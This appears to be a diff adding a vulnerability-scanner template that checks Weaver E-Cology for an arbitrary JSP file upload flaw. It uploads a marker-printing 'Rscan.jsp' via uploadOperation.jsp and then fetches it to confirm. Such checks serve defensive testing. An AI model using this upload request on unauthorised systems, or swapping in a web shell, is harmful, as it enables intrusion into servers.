@@ -1,0 +1,19 @@
+name: 泛微E-Cology-uploadOperation-文件上传
+description: >
+  文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /page/exportImport/uploadOperation.jsp
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
+    body: "------WebKitFormBoundaryFy3iNVBftjP6IOwo\r\nContent-Disposition: form-data; name=\"file\"; filename=\"Rscan.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.print(Rscan_test);%>\r\n------WebKitFormBoundaryFy3iNVBftjP6IOwo--"
+    expression:
+      status: 200 
+  - method: GET
+    path: /page/exportImport/fileTransfer/Rscan.jsp
+    expression:
+      status: 200
+      body_all:
+        - "Rscan_test"
